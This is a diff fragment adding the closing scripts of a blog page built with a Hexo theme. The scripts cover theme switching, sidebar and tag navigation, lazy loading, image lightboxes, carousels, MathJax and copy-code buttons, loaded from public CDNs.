+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.0" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":"https://site-info-api-tan.vercel.app/api/v1?url={href}"},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+    processEscapes: true
+  }
+});
+MathJax.Hub.Config({
+  tex2jax: {
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+  }
+});
+MathJax.Hub.Queue(function() {
+  var all = MathJax.Hub.getAllJax(), i;
+  for(i=0; i < all.length; i += 1) {
+    all[i].SourceElement().parentNode.className += ' has-jax';
+  }
+});
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
